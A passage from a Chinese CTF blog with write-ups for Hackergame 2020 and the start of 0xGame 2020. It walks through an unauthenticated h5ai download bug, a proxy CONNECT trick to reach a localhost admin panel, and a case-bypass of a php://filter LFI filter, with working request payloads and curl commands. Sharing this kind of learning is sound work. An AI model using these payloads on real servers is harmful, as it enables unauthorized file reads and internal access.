keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">shell_cmd</span><span class="token punctuation">(</span>Archive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$ZIP_PASSTHRU_CMD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>这里就用 <code>shell-zip</code> 好了，其实都行。</p><p>于是这题其实就是 <strong>h5ai 自带的 API 造成的文件读取</strong>，主要这个接口没有鉴权，更主要的是 Dockerfile 里用的是 cp 复制而不是 mv 移动。</p><p>噢对了，要用根目录的那个 <code>_h5ai</code>.</p><p>（发现根目录访问 <code>.php</code> 会直接丢给 fastcgi 处理了，也就绕过了 Basic Auth。</p><p><strong>Payload:</strong>  POST</p><pre><code>http://202.38.93.111:10120/_h5ai/public/index.php?action=download&amp;as=flag&amp;type=shell-zip&amp;baseHref=/</code></pre><p>（<code>hrefs</code> 参数发现不需要也行。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105011630778.png" alt="FLAG"></p><p>保存响应，然后解压就得到 flag.txt 了。</p><p><code>flag{super_secure_cloud}</code></p><blockquote><p>BTW, 有大佬发现这里的<code>hrefs</code> 参数没有检查 <code>\\..</code>, <code>..\\</code> 等，可以构造路径 <code>/Public\\..\\flag.txt</code>，此时经过 normalize 后 <code>/Public/../</code>，从而路径穿越实现任意文件读取。</p><p>详见 <a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/54ddd50dad28aa1fe898edbccb1d266a31798879/players/cytvictor/writeup.md" target="_blank" rel="noopener">cytvictor 师傅的 WriteUp</a></p><p><a href="https://github.com/lrsjng/h5ai/issues/758" target="_blank" rel="noopener">h5ai#758: A potential security issue of unauthorized access</a></p><p>以及 <a href="https://github.com/lrsjng/h5ai/issues/760" target="_blank" rel="noopener">h5ai#760: Unchecked l10n input leads to arbitrary JSON file reads</a></p><p>（算是 0day 漏洞了吧</p></blockquote><hr><h2 id="超安全的代理服务器"><a href="#超安全的代理服务器" class="headerlink" title="超安全的代理服务器"></a>超安全的代理服务器</h2><p><em>（复现）</em></p><blockquote><p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p><p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p><p><strong>公告：题目帮助页面（<a href="https://146.56.228.227/help）右下角的「管理中心」链接有误，应该与首页相同，都是指向" target="_blank" rel="noopener">https://146.56.228.227/help）右下角的「管理中心」链接有误，应该与首页相同，都是指向</a> <a href="http://127.0.0.1:8080/" target="_blank" rel="noopener">http://127.0.0.1:8080/</a></strong></p></blockquote><h3 id="找到-Secret"><a href="#找到-Secret" class="headerlink" title="找到 Secret"></a>找到 Secret</h3><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107205709657.png" alt="主页"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107205810635.png" alt="help"></p><p>这题用了 HTTP2 的 Server PUSH。</p><p>具体可以参考一下 <a href="https://en.wikipedia.org/wiki/HTTP/2_Server_Push" target="_blank" rel="noopener">Wikipedia: HTTP/2 Server Push</a> 以及 <a href="http://www.ruanyifeng.com/blog/2018/03/http2_server_push.html" target="_blank" rel="noopener">阮一峰的HTTP/2 服务器推送（Server Push）教程</a>。</p><p>通常用到 Server Push 的话都是把 CSS、JS 之类的资源顺便推送给用户，然而这一题换了几个浏览器都没见到推送了啥资源……</p><p>甚至用 Postman（貌似不支持 HTTP2?） / Burp Suite（手动改请求头）降级到 HTTP/1.0 或者 HTTP/1.1，就不让你用。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107210459289.png" alt="postman"></p><p>而 cURL 都直接不让你用。把 headers 都加上了，也不知道他怎么判断到的。。</p><pre class=" language-bash"><code class="language-bash">curl <span class="token string">"https://146.56.228.227/"</span> -H <span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span> -H <span class="token string">"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span> -H <span class="token string">"Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span> --compressed -H <span class="token string">"Connection: keep-alive"</span> -H <span class="token string">"Upgrade-Insecure-Requests: 1"</span> -H <span class="token string">"Pragma: no-cache"</span> -H <span class="token string">"Cache-Control: no-cache"</span> -H <span class="token string">"TE: Trailers"</span> -k -vv --http2</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107210632627.png" alt="curl"></p><p>但是这个信息肯定是在网络流里传输的，Wireshark 抓包的话肯定能抓到。</p><p>但是这里用到了 tls 加密，直接抓是抓不到明文的，然而我做这题的时候没配好还是没抓到明文（大草。</p><p>首先需要在系统设置一个 <code>SSLKEYLOGFILE</code> 环境变量，变量值为你喜欢的路径下建的一个用来保存 log 的文件。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230305958.png" alt="编辑环境变量"></p><p>而后在 wireshark 里设置文件路径。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230402487.png" alt="Wireshark设置"></p><p>再打开浏览器访问题目，就能在 wireshark 里抓到明文包了。</p><p>追踪 TLS 流 / HTTP2 stream 就能看到这个推送的 secret 和 flag1 了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230038744.png" alt="flag1"></p><blockquote><p>:warning: <strong>抓包完成后请及时删除此环境变量，防止信息泄露。</strong> </p></blockquote><p>这个题看到官方WP 给了基于 nghttp2 的解法。</p><pre class=" language-bash"><code class="language-bash">nghttp -v https://146.56.228.227/</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108000716189.png" alt="另一种解法"></p><h3 id="入侵管理中心"><a href="#入侵管理中心" class="headerlink" title="入侵管理中心"></a>入侵管理中心</h3><p>网页上的 管理中心 URL 为 <a href="http://127.0.0.1:8080/" target="_blank" rel="noopener">http://127.0.0.1:8080/</a> ，访问 <a href="http://146.56.228.227:8080/" target="_blank" rel="noopener">http://146.56.228.227:8080/</a> 提示</p><blockquote><p>管理中心无法从公网直接访问</p></blockquote><p>根据 帮助 给出的提示，需要利用 CONNECT 协议。</p><p>根据 <a href="https://tools.ietf.org/html/rfc7231#section-4.3.6" target="_blank" rel="noopener">RFC 7231</a> 中的相关内容，结合题目所需的<code>secret</code>，请求头格式如下。</p><pre><code>CONNECT server.example.com:80 HTTP/1.1Host: server.example.com:80Secret: xxxxxxxx</code></pre><p>再看过滤的列表</p><blockquote><ul><li>全球单播地址</li><li>10.0.0.0/8</li><li>127.0.0.0/8</li><li>172.16.0.0/12</li><li>192.168.0.0/16</li></ul></blockquote><p>其中不包括 IPv6 地址，可以试试本地环回，即<code>[::1]</code>。</p><p>构造请求发过去试试，发现成功建立连接。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107233927125.png" alt="成功建立连接"></p><blockquote><p>The recipient proxy can establish a tunnel either by directly connecting to the request-target or, if configured to use another proxy, by forwarding the CONNECT request to the next inbound proxy. Any 2xx (Successful) response indicates that the sender (and all inbound proxies) will switch to tunnel mode immediately after the blank line that concludes the successful response’s header section; data received after that blank line is from the server identified by the request-target.  Any response other than a successful response indicates that the tunnel has not yet been formed and that the connection remains governed by HTTP.</p><p>A tunnel is closed when a tunnel intermediary detects that either side has closed its connection: the intermediary MUST attempt to send any outstanding data that came from the closed side to the other side, close both connections, and then discard any remaining data left undelivered.</p></blockquote><p>说明隧道已经建立了，但貌似做不到马上发下一个请求，于是隧道就关闭了。</p><p>用 Burp Suite 发包这个方案不实在（（</p><p>好烦啊喵，用 curl 好了吧。（参考了官方 WP）</p><p>需要带上 Referer，否则会提示 </p><blockquote><p>管理中心需要从 ‘146.56.228.227’ 被访问(Referer)</p></blockquote><pre class=" language-bash"><code class="language-bash">$ curl -x https://146.56.228.227:443 --proxy-insecure -vvnn -p --proxy-header <span class="token string">"Secret: aa08235651"</span> http://<span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080 -H <span class="token string">"Referer: 146.56.228.227"</span>* Rebuilt URL to: http://<span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080/* Couldn't <span class="token function">find</span> host ::1 <span class="token keyword">in</span> the .netrc <span class="token function">file</span><span class="token punctuation">;</span> using defaults*   Trying 146.56.228.227<span class="token punctuation">..</span>.* TCP_NODELAY <span class="token keyword">set</span>* Connected to 146.56.228.227 <span class="token punctuation">(</span>146.56.228.227<span class="token punctuation">)</span> port 443 <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#0)</span>* successfully <span class="token keyword">set</span> certificate verify locations:*   CAfile: /etc/ssl/certs/ca-certificates.crt  CApath: /etc/ssl/certs* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS handshake, Client hello <span class="token punctuation">(</span>1<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Server hello <span class="token punctuation">(</span>2<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span>22<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Unknown <span class="token punctuation">(</span>8<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span>22<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Certificate <span class="token punctuation">(</span>11<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span>22<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, CERT verify <span class="token punctuation">(</span>15<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span>22<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Finished <span class="token punctuation">(</span>20<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS change cipher, Client hello <span class="token punctuation">(</span>1<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span>22<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS handshake, Finished <span class="token punctuation">(</span>20<span class="token punctuation">)</span>:* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256* Proxy certificate:*  subject: O<span class="token operator">=</span>mkcert development certificate<span class="token punctuation">;</span> OU<span class="token operator">=</span>root@hg20-debian*  start date: Jun  1 00:00:00 2019 GMT*  expire date: Oct 23 01:13:11 2030 GMT*  issuer: O<span class="token operator">=</span>mkcert development CA<span class="token punctuation">;</span> OU<span class="token operator">=</span>root@hg20-debian<span class="token punctuation">;</span> CN<span class="token operator">=</span>mkcert root@hg20-debian*  SSL certificate verify result: unable to get local issuer certificate <span class="token punctuation">(</span>20<span class="token punctuation">)</span>, continuing anyway.* allocate connect buffer<span class="token operator">!</span>* Establish HTTP proxy tunnel to ::1:8080* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span>23<span class="token punctuation">)</span>:<span class="token operator">></span> CONNECT <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080 HTTP/1.1<span class="token operator">></span> Host: <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080<span class="token operator">></span> User-Agent: curl/7.58.0<span class="token operator">></span> Proxy-Connection: Keep-Alive<span class="token operator">></span> Secret: aa08235651<span class="token operator">></span> * TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span>22<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Newsession Ticket <span class="token punctuation">(</span>4<span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span>23<span class="token punctuation">)</span>:<span class="token operator">&lt;</span> HTTP/1.1 200 OK* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span>23<span class="token punctuation">)</span>:<span class="token operator">&lt;</span> Content-Length: 0* Ignoring Content-Length <span class="token keyword">in</span> CONNECT 200 response* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span>23<span class="token punctuation">)</span>:<span class="token operator">&lt;</span> * Proxy replied 200 to CONNECT request* CONNECT phase completed<span class="token operator">!</span>* CONNECT phase completed<span class="token operator">!</span>* CONNECT phase completed<span class="token operator">!</span>* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span>23<span class="token punctuation">)</span>:<span class="token operator">></span> GET / HTTP/1.1<span class="token operator">></span> Host: <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080<span class="token operator">></span> User-Agent: curl/7.58.0<span class="token operator">></span> Accept: */*<span class="token operator">></span> Referer: 146.56.228.227<span class="token operator">></span> * TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span>23<span class="token punctuation">)</span>:<span class="token operator">&lt;</span> HTTP/1.1 200 OK<span class="token operator">&lt;</span> Date: Sat, 07 Nov 2020 15:59:36 GMT<span class="token operator">&lt;</span> Content-Length: 32<span class="token operator">&lt;</span> Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>utf-8<span class="token operator">&lt;</span> * Connection <span class="token comment" spellcheck="true">#0 to host 146.56.228.227 left intact</span>flag2: flag<span class="token punctuation">{</span>c0me_1n_t4_my_h0use<span class="token punctuation">}</span></code></pre><p>另外看到 <a href="https://imlonghao.com/58.html" target="_blank" rel="noopener">imlonghao 师傅的命令大法</a>。（原来的代码在我这 Ubuntu 报错，于是改了一下反引号执行）</p><pre class=" language-bash"><code class="language-bash">curl -v -k --proxy https://146.56.228.227/ --proxy-insecure --proxy-header <span class="token string">"Secret: <span class="token variable"><span class="token variable">`</span><span class="token punctuation">(</span>nghttp https://146.56.228.227/ 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> secret: <span class="token operator">|</span> <span class="token function">awk</span> '<span class="token punctuation">{</span>print $4<span class="token punctuation">}</span>'<span class="token punctuation">)</span><span class="token variable">`</span></span>"</span> http://www.ustc.edu.cn.127.0.0.1.nip.io:8080/ -p -H <span class="token string">"Referer: https://146.56.228.227"</span></code></pre><p>BTW， <a href="http://www.ustc.edu.cn.127.0.0.1.nip.io" target="_blank" rel="noopener">www.ustc.edu.cn.127.0.0.1.nip.io</a> 这个域名会解析到 127.0.0.1，详见 <a href="https://nip.io" target="_blank" rel="noopener">https://nip.io</a> 任意 IP DNS 泛域名。</p><hr><h2 id="不经意传输"><a href="#不经意传输" class="headerlink" title="不经意传输"></a>不经意传输</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> random <span class="token keyword">import</span> SystemRandom<span class="token keyword">import</span> os<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    random <span class="token operator">=</span> SystemRandom<span class="token punctuation">(</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span>e<span class="token punctuation">)</span>    m0 <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>    m1 <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>    x0 <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span>key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span>key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x0 ="</span><span class="token punctuation">,</span> x0<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x1 ="</span><span class="token punctuation">,</span> x1<span class="token punctuation">)</span>    v <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"v = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    m0_ <span class="token operator">=</span> <span class="token punctuation">(</span>m0 <span class="token operator">+</span> pow<span class="token punctuation">(</span>v <span class="token operator">-</span> x0<span class="token punctuation">,</span> key<span class="token punctuation">.</span>d<span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>n    m1_ <span class="token operator">=</span> <span class="token punctuation">(</span>m1 <span class="token operator">+</span> pow<span class="token punctuation">(</span>v <span class="token operator">-</span> x1<span class="token punctuation">,</span> key<span class="token punctuation">.</span>d<span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>n    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m0_ ="</span><span class="token punctuation">,</span> m0_<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m1_ ="</span><span class="token punctuation">,</span> m1_<span class="token punctuation">)</span>    guess0 <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"m0 = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    guess1 <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"m1 = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> guess0 <span class="token operator">==</span> m0<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">"flag1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> guess1 <span class="token operator">==</span> m1<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">"flag2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nope"</span><span class="token punctuation">)</span></code></pre><h3 id="解密消息"><a href="#解密消息" class="headerlink" title="解密消息"></a>解密消息</h3><p>直接令 <code>v = x0</code>，这样直接就 <code>m0_ = m0</code> 了，得到 flag1.</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105215141495.png" alt="flag1"></p><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总而言之，这次 Hackergame <strong>题目很有梯度，很有脑洞，感觉不错，学到了许多，下次还来</strong>。</p><p>排名的话不停弹跳，好不容易做出道题目上去了，而后掉下来，到了最高的记录也就总榜 rk31 了，最后还是不停往下掉，最后都到总榜 rk41了，233.</p><p><img src="/2020/11/08/CTF_2020Hackergame/image_2020-11-07_15-31-29.png" alt="总排名"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033648244.png" alt="解题情况"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033920730.png" alt="解题情况"></p><p>rk31 顺便留个纪念👇</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033613828.png" alt="最高记录"></p><p>大师傅们太强了！</p><p>喵呜，还是太菜了啊，我自己爬（</p><hr><p>感觉这篇可以说是最长一篇博客了唉</p><p>（先这样吧 写不动了</p><p>（溜了溜了喵</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 0xGame Web&amp;Misc 部分WriteUp</title>
      <link href="/2020/11/05/CTF_2020_0xGame/"/>
      <url>/2020/11/05/CTF_2020_0xGame/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>南邮的师傅们整了个 0xGame，比赛持续了一个月，每周放出一定的题目。</p><p>大概看了看，题目还是有点意思的。</p><blockquote><p>比赛平台：<a href="http://game.0xctf.com/" target="_blank" rel="noopener">http://game.0xctf.com/</a></p><p>往期赛题环境：<a href="https://shimo.im/docs/8hkRHdRDdWyKycyK" target="_blank" rel="noopener">https://shimo.im/docs/8hkRHdRDdWyKycyK</a></p></blockquote><p>主要顺便总结了一下 <strong>PHP SESSION 序列化引擎不同带来的反序列化漏洞</strong>吧。</p><p><em>（由于比较懒就没怎么写 WP，写的也比较简略</em></p><p>嘤嘤嘤（跑</p><hr><h2 id="Week-4"><a href="#Week-4" class="headerlink" title="Week 4"></a>Week 4</h2><h3 id="Web-switch"><a href="#Web-switch" class="headerlink" title="Web_switch"></a>Web_switch</h3><blockquote><p>小明在使用vim时电脑死机了，但是他写的代码还没有保存，这可怎么办呢？</p><p><a href="http://web.game.0xctf.com:30103/" target="_blank" rel="noopener">http://web.game.0xctf.com:30103/</a></p></blockquote><p>访问显示</p><blockquote><p>Do you know vim in Linux?</p></blockquote><p>想到应该是 vim 的缓存文件吧。</p><p>即 <code>.index.php.swp</code></p><p>下载以后用 vim 加载</p><pre class=" language-bash"><code class="language-bash">vim -r .index.php.swp</code></pre><p>而后 <code>:wq</code> 保存得到源码。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag in flag.php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'&lt;h1 align="center">&lt;font color="red">Do you know vim in Linux?&lt;/font>&lt;/h1>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"0xGame Good!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/filter|base64/'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>POST 接收两个参数，<code>id</code> 的话在 <code>switch</code> 里会被强制类型转换，只需要输入第一个字符为 2 即可。</p><p><code>file</code> 的话用 PHP 伪协议去读取。</p><p>虽然过滤了<code>filter|base64</code>，但匹配时没有不区分大小写，而 PHP 对大小写不敏感，于是改个大小写就完事了。</p><p>payload:</p><pre><code>id=2sdf&amp;file=php://filTer/read=convert.basE64-encode/resource=flag.php</code></pre><p>得到 </p><pre><code>PD9waHANCiRmbGFnPScweEdhbWV7UzBtZV9wSHBfdFIxY0tzX3VfRzN0XzF0fSc7</code></pre><p>base64decode</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'0xGame{S0me_pHp_tR1cKs_u_G3t_1t}'</span><span class="token punctuation">;</span></code></pre><p>get!</p><h3 id="Web-broken-motto"><a href="#Web-broken-motto" class="headerlink" title="Web_broken_motto"></a>Web_broken_motto</h3><blockquote><ul><li>motto为啥查看不了了啊？</li><li>Hint：注意查看注释的地方，注释前后有什么区别</li><li><a href="http://web.game.0xctf.com:30060" target="_blank" rel="noopener">题目地址</a></li></ul></blockquote><p><strong>现学现卖的一题，顺便来总结了一下相关的知识点，PHP 太奇妙了真的。</strong></p><p>先源码审计。</p><p><code>register.php</code>:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'motto'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 